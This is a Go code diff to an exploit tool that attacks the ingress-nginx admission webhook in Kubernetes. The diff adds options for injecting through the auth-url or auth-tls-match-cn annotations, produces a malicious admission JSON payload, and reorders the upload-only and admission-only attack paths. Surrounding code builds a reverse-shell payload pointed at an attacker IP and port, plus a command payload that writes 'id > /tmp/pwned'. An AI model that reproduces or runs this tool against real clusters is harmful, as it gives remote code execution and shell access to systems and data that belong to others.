@@ -33,6 +33,8 @@ var Opts = struct {
 	OnlyAdmission         bool
 	OnlyAdmissionFilePath string
 	OnlyUpload            bool
+
+	nginx_ingress.ExploitMethod
 }{}
 
 func defaultPodIp() net.IP {
@@ -58,6 +60,10 @@ func init() {
 	ExpCmd.Flags().StringVarP(&Opts.UploadUrl, "upload-url", "u",
 		"http://ingress-nginx-controller.ingress-nginx.svc.cluster.local:80",
 		"upload url")
+
+	ExpCmd.Flags().BoolVarP(&Opts.IsAuthURL, "is-auth-url", "a", true, "using auth-url to attack (default)")
+	ExpCmd.Flags().BoolVarP(&Opts.IsAuthTLSMatchCN, "is-match-cn", "A", false, "using auth-tls-match-cn to attack (not default)")
+	ExpCmd.Flags().StringVarP(&Opts.AuthSecret, "auth-secret-name", "U", "", "if using auth-tls-match-cn, secret name is required, example: kube-system/cilium-ca")
 
 	ExpCmd.Flags().IPVarP(&Opts.ReverseShellIp, "reverse-shell-ip", "r", defaultPodIp(), "reverse shell ip")
 	ExpCmd.Flags().Uint16VarP(&Opts.ReverseShellPort, "reverse-shell-port", "p", 0, "reverse shell port")
@@ -95,6 +101,37 @@ var ExpCmd = &cobra.Command{
 		nginx_ingress.Init()
 	},
 	Run: func(cmd *cobra.Command, args []string) {
+		if Opts.AuthSecret != "" {
+			Opts.IsAuthTLSMatchCN = true
+			Opts.IsAuthURL = false
+		}
+		if Opts.IsAuthTLSMatchCN && Opts.AuthSecret == "" {
+			log.Fatal("auth-secret-name is required when using auth-tls-match-cn")
+		}
+		if Opts.IsAuthURL && Opts.IsAuthTLSMatchCN {
+			log.Fatal("auth-url and auth-tls-match-cn are mutually exclusive")
+		}
+		err := nginx_ingress.RenderValidateJSON(nginx_ingress.ExploitMethod{
+			IsAuthURL:        Opts.IsAuthURL,
+			IsAuthTLSMatchCN: Opts.IsAuthTLSMatchCN,
+			AuthSecret:       Opts.AuthSecret,
+		})
+		if err != nil {
+			log.Fatalf("error validating exploit method: %v", err)
+		}
+		if Opts.OnlyAdmission {
+			if Opts.OnlyAdmissionFilePath == "" {
+				log.Fatal("only-admission-file is required")
+			}
+			if Opts.DryRun {
+				log.Infoln("dry-run mode, payload:")
+				_, _ = os.Stdout.Write([]byte(strings.ReplaceAll(nginx_ingress.ValidateJson(), "foobar", Opts.OnlyAdmissionFilePath)))
+				return
+			}
+			nginx_ingress.OnlyAdmissionRequest(Opts.IngressWebhookUrl, Opts.OnlyAdmissionFilePath)
+			return
+		}
+
 		var payload nginx_ingress.Payload
 		switch Opts.Mode {
 		case "reverse-shell", "r":
@@ -107,20 +144,13 @@ var ExpCmd = &cobra.Command{
 			payload = nginx_ingress.NewCommandPayload("id > /tmp/pwned")
 		}
 		log.Infof("Constructed payload successfully")
+		if Opts.OnlyUpload {
+			nginx_ingress.OnlyUplaoder(Opts.UploadUrl, payload)
+			return
+		}
 		if Opts.DryRun {
 			log.Infoln("dry-run mode, payload:")
 			_, _ = os.Stdout.Write(payload)
-			return
-		}
-		if Opts.OnlyAdmission {
-			if Opts.OnlyAdmissionFilePath == "" {
-				log.Fatal("only-admission-file is required")
-			}
-			nginx_ingress.OnlyAdmissionRequest(Opts.IngressWebhookUrl, Opts.OnlyAdmissionFilePath)
-			return
-		}
-		if Opts.OnlyUpload {
-			nginx_ingress.OnlyUplaoder(Opts.UploadUrl, payload)
 			return
 		}
 		log.Tracef("mode chosen: %s", Opts.Mode)
